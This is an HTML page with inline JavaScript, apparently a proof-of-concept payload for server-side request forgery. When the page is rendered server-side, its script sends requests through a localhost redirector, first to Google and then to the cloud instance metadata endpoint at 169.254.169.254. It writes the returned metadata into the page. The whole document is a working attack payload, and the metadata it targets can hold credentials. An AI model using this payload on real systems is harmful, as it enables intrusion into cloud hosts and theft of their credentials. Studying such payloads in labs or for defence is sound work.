<!DOCTYPE html>
<html>
<head>
    <title>SSRF via Localhost</title>
</head>
<body>
    <h1>SSRF Test via Localhost</h1>
    <div id="test1"></div>
    <div id="test2"></div>
    <div id="error"></div>
    
    <script>
        try {
            // Test 1: Basic redirector access via localhost (like original writeup)
            var xhr1 = new XMLHttpRequest();
            xhr1.open('GET', 'http://localhost/redir.php?url=https://www.google.com', false);
            xhr1.send();
            document.getElementById("test1").innerHTML = 
                "<h2>✅ Redirector via localhost:</h2><pre>" + xhr1.responseText.substring(0, 500) + "...</pre>";
            
            // Test 2: If that works, try metadata service via redirector
            var xhr2 = new XMLHttpRequest();
            xhr2.open('GET', 'http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/', false);
            xhr2.send();
            document.getElementById("test2").innerHTML = 
                "<h2>✅ Metadata via redirector:</h2><pre>" + xhr2.responseText + "</pre>";
                
        } catch(err) {
            document.getElementById('error').innerHTML = 
                "<h2>❌ Error:</h2>" + err.message;
        }
    </script>
</body>
</html>
